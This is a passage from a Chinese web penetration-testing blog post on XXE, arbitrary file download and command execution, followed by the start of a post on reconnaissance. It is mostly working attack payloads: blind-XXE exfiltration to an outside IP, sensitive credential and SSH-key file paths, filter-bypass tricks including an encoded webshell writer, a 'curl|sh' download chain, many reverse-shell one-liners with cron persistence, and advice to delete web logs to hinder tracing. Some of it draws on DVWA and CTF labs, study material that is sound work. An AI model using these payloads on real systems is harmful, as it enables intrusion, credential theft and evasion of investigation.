<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY melon SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;melon;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxe.png" alt="html">    </p>
<p>可以看到响应头获取到了文件的数据</p>
<p><strong>XXE（无回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxes.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;!DOCTYPE roottag [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.txt&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://47.9x.xx.xx/xxe.dtd&quot;&gt; </span><br><span class="line">%dtd;]&gt; </span><br><span class="line">&lt;name&gt;&amp;send;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<p>远端服务器存放的dtd代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://47.93.12.104:7777/?%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes1.png" alt="html">    </p>
<p>此时xml是执行的但是没有回显出来，我们看一下服务器端。</p>
<p>服务器端采用的nc监听端口</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes2.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes3.png" alt="html">    </p>
<p>我们来说一下外部调用实体化的流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//localhost为本地服务器 melon为远端服务器</span><br><span class="line">1.localhost 解析了 XML，并将%dtd;求值为 melon 的服务器的外部调用。</span><br><span class="line">2.melon 的服务器向 localhost 返回了xxe.dtd文件。</span><br><span class="line">3.localhost 解析了收到的 DTD文件，它触发了%all;的调用。</span><br><span class="line">4.当%all;求值时，它定义了&amp;send;，它包含%file;实体的调用。</span><br><span class="line">5.%file;在 URL 值中被替换为/etc/passwd文件的内容。</span><br><span class="line">6.localhost 解析了 XML 文件，发现了&amp;send;实体，它求值为 melon 服务器的远程调用，带有melon.txt的内容，作为 URL 中的参数。</span><br></pre></td></tr></table></figure>

<h3 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h3><p><strong>漏洞形成过程</strong></p>
<p>首先漏洞源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileAcquisition.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];  </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);  </span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);  </span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);  </span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file1.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file2.png" alt="html">    </p>
<p>跨目录下载：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file3.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file4.png" alt="html">    </p>
<p>说一下敏感文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//Windows下</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br><span class="line"></span><br><span class="line">//Linux下</span><br><span class="line">root/.ssh/authorized_keys ////如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow //账户密码文件</span><br><span class="line">/etc/my.cnf //mysql配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

<p>补：<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt" target="_blank" rel="noopener">大佬搜集的一部分linux的敏感文件路径</a></p>
<p><strong>漏洞挖掘</strong>：</p>
<p>可以用Google hack：<code>inurl:&quot;file.php?file=&quot; inurl : readfile.php?file= inurl : download.php?file=</code></p>
<p>观察页面是否实现这种功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure>

<p>观察链接参数名路径名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;RealPath= &amp;FilePath= &amp;ﬁlepath= &amp;Filepath= &amp;Path= &amp;path= &amp;inputFile= &amp;Inputfile= &amp;url= &amp;urls= &amp;Lang= &amp;dis= &amp;data= &amp;Data= &amp;readﬁle= &amp;ﬁlep= &amp;src= &amp;menu=</span><br><span class="line"></span><br><span class="line">//java的重要路径</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>Linux下一种思路：在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。可以算是一个杀器吧。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/locate.png" alt="html">    </p>
<h3 id="8-远程代码或系统命令执行-RCE"><a href="#8-远程代码或系统命令执行-RCE" class="headerlink" title="8.远程代码或系统命令执行(RCE)"></a>8.远程代码或系统命令执行(RCE)</h3><p>首先我们了解一下命令拼接符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;&amp;        第一个命令执行成功才会执行第二个命令否则不能继续执行</span><br><span class="line">&amp;		 即使第一个command1没有执行成功，也会执行command2 执行成功则都执行</span><br><span class="line">|    	 不管command1是否执行成功，都执行command2，不返回command1的结果 上一条命令的输出，作为下一条命令参数</span><br><span class="line">|| 		 表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">;		 分号表示命令依次执行。</span><br><span class="line"></span><br><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>

<p>这里我们以DVWA为例代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    $target = $_POST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">//下面判断系统</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DVWARCE.png" alt="html">    </p>
<p><strong>空格绕过</strong></p>
<p>Linux不能使用空格时的一些绕过 例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS&quot;&lt;?php system($_GET[x]);?&gt;&quot;&gt;shell.php  </span><br><span class="line">//$IFS$9,$&#123;IFS&#125;，$IFS 都可以 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IFS.png" alt="html">    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;echo,&apos;Melon&apos;&#125;&gt;test.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/wshell.png" alt="html"></p>
<p><strong>黑名单拼接绕过</strong></p>
<p><code>a=l;b=s;$a$b</code></p>
<p><strong>黑名单编码绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64:</span><br><span class="line">echo &quot;bWVsb24K&quot;|base64 -d 其将会打印melon //echo &quot;字符串&quot; |base 则是直接加密</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash //等同于 cat /flag</span><br><span class="line"></span><br><span class="line">HEX:</span><br><span class="line">echo &quot;melon&quot; | xxd</span><br><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash</span><br><span class="line"></span><br><span class="line">oct:</span><br><span class="line">$(printf &quot;\154\163&quot;) //ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) //cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 //cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br><span class="line"></span><br><span class="line">单引号和双引号绕过:</span><br><span class="line">例：ca&apos;&apos;t flag 或 ca&quot;&quot;t flag</span><br><span class="line"></span><br><span class="line">反斜杠绕过:</span><br><span class="line">比如：ca\t fl\ag</span><br><span class="line"></span><br><span class="line">利用Shell 特殊变量绕过:</span><br><span class="line">//n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">ca$@t fla$@g</span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>

<p><strong>长度限制绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需要用的知识点:</span><br><span class="line">linux下可以用 &gt;a 创建文件名为a的空文件 // &gt;是覆盖 &gt;&gt;是追加 我们一行一行写肯定选择追加</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中 //我们需要反着写也就是从构造好的payload的下面写到上面</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行</span><br></pre></td></tr></table></figure>

<p>测试在文本里内容如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//melon.txt 真实的话文件名要改成 a 因为是绕长度限制</span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure>

<p>执行：<code>sh melon.txt</code></p>
<p>那怎样将内容输出到文本当中就是我们需要做的事 </p>
<p>下面是我们的解决方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8B%BC%E6%8E%A5hello.png" alt="html"></p>
<p>第一行显示找不到因为先创建 _ 文件再进行输出到_文件里。</p>
<p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令</p>
<p>这方面也有对应的CTF题目 源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span>.md5(<span class="string">"orange"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>哪可不可以利用这种方法反弹shell呢？当然是可以的具体操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1 //标准的反弹shell命令</span><br><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>

<p>这个时候我们遇到了两个个问题 </p>
<p>其一：<code>ls -t&gt;_</code> 也就是当我们吧文件全部创建好按时间将文件名输入到a文件中时发现我们的命令是七个字符我们需要一个先把这条命令写出来才行</p>
<p>其二：执行命令需要空格 但是我们需要两个空格 相同的文件怎么可以创建两个呢 这时候可以用 <code>curl url|sh</code> 的方式 只需要再服务器上构建好payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决问题一</span><br><span class="line">&gt;ls\\ //创建 &quot;ls\&quot; 文件</span><br><span class="line">ls&gt;_  //将ls的排序写入&quot;_&quot;文件 此时文件内容为 &quot;_ ls\&quot;</span><br><span class="line">&gt;\ \\ //创建 &quot; \&quot;文件</span><br><span class="line">&gt;-t\\ //创建&quot;-t\&quot;文件</span><br><span class="line">&gt;\&gt;y  //创建&quot;&gt;y&quot;文件</span><br><span class="line">// ls命令排序的规则是空格和符号最前，数字其次，字母最后</span><br><span class="line">ls&gt;&gt;_ //将ls的排序追加到&quot;_&quot;文件</span><br><span class="line">//ls排序结果如下：</span><br><span class="line">&quot; \&quot;  &quot;_&quot;  &quot;ls\&quot;  &quot;-t\&quot; &quot;&gt;y&quot;</span><br><span class="line">追加之后&quot;_&quot;的内容为：</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">\</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">-t\</span><br><span class="line">&gt;y</span><br><span class="line">执行:sh _ 生成一个m文件</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们需要sh m 其中 m 中包含了 curl xx.xx.xx.xxx|sh</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">//这里有一个坑就是创建文件不能以 .开头 否则为隐藏文件ls -t读取的时候读不到 我也尝试构造&quot;_&quot;的时候添加-a参数来达到目的 但好像不可能的事情 或许也是我没想到 欢迎师傅们提出意见 </span><br><span class="line">//为什么我要说到这里 因为我服务器的IP正好构造的时候会出现同名文件 以点开头构造又没法绕过 用域名云空间Github或者ip的每位全是三位的都可以 方法还是很多的</span><br></pre></td></tr></table></figure>

<p>利用：这时我们用”_”文件生成”y”文件 用y文件查看服务器反弹shell命令通过管道符执行命令 成功反弹shell</p>
<p><strong>内联执行</strong></p>
<p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/neilian.png" alt="html"></p>
<p><strong>通配符</strong></p>
<p>[…]<code>表示匹配方括号之中的任意一个字符。
比如</code>[aeiou]<code>可以匹配五个元音字母，</code>[a-z]`匹配任意小写字母。<br>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
<p><code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p>
<p>测试如下：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_1.png" alt="html"></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_2.png" alt="html"></p>
<p><strong>反弹shell</strong></p>
<p>bash方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>exec方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>

<p>nc方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机运行:</span><br><span class="line">nc -l -vv -p port</span><br><span class="line">目标主机:</span><br><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>

<p>python方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure>

<p>crontab</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是</span><br><span class="line">/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>telnet</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<p><strong>linux中直接查看文件内容的工具</strong></p>
<p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
<h3 id="9-其他的一些注入问题"><a href="#9-其他的一些注入问题" class="headerlink" title="9.其他的一些注入问题"></a>9.其他的一些注入问题</h3><p>soap注入 邮件头注入 ldap注入 xpath注入 xml实体注入</p>
<h3 id="10-手工分析HTTP请求"><a href="#10-手工分析HTTP请求" class="headerlink" title="10.手工分析HTTP请求"></a>10.手工分析HTTP请求</h3><p>Burpsuite Fiddler Wireshark Tcpdump</p>
<h3 id="11-防护不严格的情况下直接用漏扫"><a href="#11-防护不严格的情况下直接用漏扫" class="headerlink" title="11.防护不严格的情况下直接用漏扫"></a>11.防护不严格的情况下直接用漏扫</h3><p>Burp WebcruiserWVS Awvs Netsparker Appcsan Owasp_zap Vega Nessus Openvas Nmap的漏洞检测脚本 Wpscan</p>
<h2 id="关于WAF对抗"><a href="#关于WAF对抗" class="headerlink" title="关于WAF对抗"></a>关于WAF对抗</h2><p>Bypass  waf分布式扫描 Bypass  waf进行注入 Bypass  waf进行上传 Bypass  waf脚本执行代码 Webshell免杀 Webshell 隐藏</p>
<h2 id="各类WEB访问日志的处理-对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。"><a href="#各类WEB访问日志的处理-对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。" class="headerlink" title="各类WEB访问日志的处理 对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。"></a>各类WEB访问日志的处理 对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-提权信息收集"><a href="#1-提权信息收集" class="headerlink" title="1.提权信息收集"></a>1.提权信息收集</h3><p>1.当前机器具体跑了哪些我们可与i直接利用到的服务端口</p>
<p>2.尽可能找到目标机的所有账号密码：数据库 VPN FTP 其他第三方工具各种密码hash或明文。</p>
<p>3.当前系统装的什么杀软，防护套装是什么，有什么样的限制策略。</p>
<p>4.装了哪些可以利用的第三方工具</p>
<p>5.特殊权限的查找入suid</p>
<h3 id="2-溢出exp"><a href="#2-溢出exp" class="headerlink" title="2.溢出exp"></a>2.溢出exp</h3><p>win linux exp免杀</p>
<h3 id="3-各类数据库提权"><a href="#3-各类数据库提权" class="headerlink" title="3.各类数据库提权"></a>3.各类数据库提权</h3><p>mysql mssql oracle</p>
<h3 id="4-其他的非主流提权法"><a href="#4-其他的非主流提权法" class="headerlink" title="4.其他的非主流提权法"></a>4.其他的非主流提权法</h3><h3 id="5-dump数据-打包文件-权限维持-处理痕迹（日志）"><a href="#5-dump数据-打包文件-权限维持-处理痕迹（日志）" class="headerlink" title="5.dump数据 打包文件 权限维持 处理痕迹（日志）"></a>5.dump数据 打包文件 权限维持 处理痕迹（日志）</h3>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>泄露</tag>
        <tag>注入</tag>
        <tag>webshll</tag>
        <tag>sql</tag>
        <tag>中间件</tag>
        <tag>未授权</tag>
        <tag>包含</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB渗透测试之信息收集</title>
    <url>/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>搞渗透的人应该都清楚，给一个目标站点做测试，第一步就是信息收集，通过各种渠道和手段尽可能收集到多的关于这个站点的信息，帮助我们更多的去找到渗透点。而信息收集的方式有很多，大致有搜索引擎、域名注册网站、shodan、github信息收集工具、网站公告等等，甚至还有社工的方式。</p>
<a id="more"></a>

<h2 id="1-拿到一个待检测的站。你觉得应该先做什么。"><a href="#1-拿到一个待检测的站。你觉得应该先做什么。" class="headerlink" title="1.拿到一个待检测的站。你觉得应该先做什么。"></a>1.拿到一个待检测的站。你觉得应该先做什么。</h2><p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息。</p>
<h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><h4 id="可用信息：邮箱地址，注册人，作者信息"><a href="#可用信息：邮箱地址，注册人，作者信息" class="headerlink" title="可用信息：邮箱地址，注册人，作者信息"></a>可用信息：邮箱地址，注册人，作者信息</h4><p>​    <a href="http://www.whois.aliyun.com" target="_blank" rel="noopener">www.whois.aliyun.com</a> //阿里<br>​    <a href="http://www.whois365.com/cn/" target="_blank" rel="noopener">www.whois365.com/cn/</a> //全球查<br>​    <a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a> //站长<br>​    <a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a> //爱站</p>
